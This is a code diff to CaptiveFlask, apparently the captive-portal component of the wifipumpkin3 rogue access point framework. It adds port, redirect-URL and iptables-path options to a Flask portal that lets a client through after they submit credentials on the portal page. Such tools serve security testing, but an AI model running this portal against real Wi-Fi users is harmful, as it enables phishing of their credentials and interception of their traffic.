@@ -1,6 +1,8 @@
 from flask import Flask, request, redirect, render_template
 from urllib.parse import urlencode, unquote
-import os, sys
+from wifipumpkin3.core.utility.collection import SettingsINI
+import wifipumpkin3.core.utility.constants as C
+import sys
 import subprocess
 import argparse
 
@@ -10,13 +12,16 @@ import argparse
 app = Flask(__name__)
 REDIRECT = None
 FORCE_REDIRECT = None
+URL_REDIRECT = None
+PORT = 80
+config = None
 
 
-def login_user(ip):
+def login_user(ip, iptables_binary_path):
     subprocess.call(
-        ["iptables", "-t", "nat", "-I", "PREROUTING", "1", "-s", ip, "-j", "ACCEPT"]
+        [iptables_binary_path, "-t", "nat", "-I", "PREROUTING", "1", "-s", ip, "-j", "ACCEPT"]
     )
-    subprocess.call(["iptables", "-I", "FORWARD", "-s", ip, "-j", "ACCEPT"])
+    subprocess.call([iptables_binary_path, "-I", "FORWARD", "-s", ip, "-j", "ACCEPT"])
 
 
 @app.route("/login", methods=["GET", "POST"])
@@ -36,9 +41,11 @@ def login():
                 }
             )
         )
-        global FORCE_REDIRECT
+        global FORCE_REDIRECT, URL_REDIRECT, config
         sys.stdout.flush()
-        login_user(request.remote_addr)
+        login_user(request.remote_addr, config.get("iptables", "path_binary"))
+        if URL_REDIRECT:
+            return redirect(URL_REDIRECT, code=302) 
         if FORCE_REDIRECT:
             return render_template("templates/login_successful.html")
         elif "orig_url" in request.args and len(request.args["orig_url"]) > 0:
@@ -60,7 +67,11 @@ def favicon():
 @app.route("/", defaults={"path": ""})
 @app.route("/<path:path>")
 def catch_all(path):
-    global REDIRECT
+    global REDIRECT, PORT
+    if PORT != 80:
+        return redirect(
+            "http://{}:{}/login?".format(REDIRECT, PORT) + urlencode({"orig_url": request.url})
+        )        
     return redirect(
         "http://{}/login?".format(REDIRECT) + urlencode({"orig_url": request.url})
     )
@@ -82,7 +93,7 @@ _version = "1.0.2"
 
 
 def main():
-    global REDIRECT, FORCE_REDIRECT
+    global REDIRECT, FORCE_REDIRECT, URL_REDIRECT, PORT, config
     print("[*] CaptiveFlask v{} - subtool from wifipumpkin3".format(_version))
     parser = argparse.ArgumentParser(
         description="CaptiveFlask - \
@@ -101,6 +112,20 @@ def main():
         help="IpAddress from gataway captive portal",
     )
     parser.add_argument(
+        "-p",
+        "--port",
+        dest="port",
+        default=80,
+        help="The port for captive portal",
+    )
+    parser.add_argument(
+        "-rU",
+        "--redirect-url",
+        dest="redirect_url",
+        default=None,
+        help="Url for redirect after user insert the credentials on captive portal",
+    )
+    parser.add_argument(
         "-f",
         "--force-login_successful-template",
         dest="force_redirect",
@@ -112,9 +137,13 @@ def main():
     args = parser.parse_args()
     REDIRECT = args.redirect
     FORCE_REDIRECT = args.force_redirect
+    URL_REDIRECT = args.redirect_url
+    PORT = args.port
+    
+    config = SettingsINI(C.CONFIG_INI)
 
     app.static_url_path = "\{}".format(args.static)
     app.static_folder = "{}".format(args.static)
     app.template_folder = args.template
 
-    app.run("0.0.0.0", port=80)
+    app.run(REDIRECT, port=args.port)
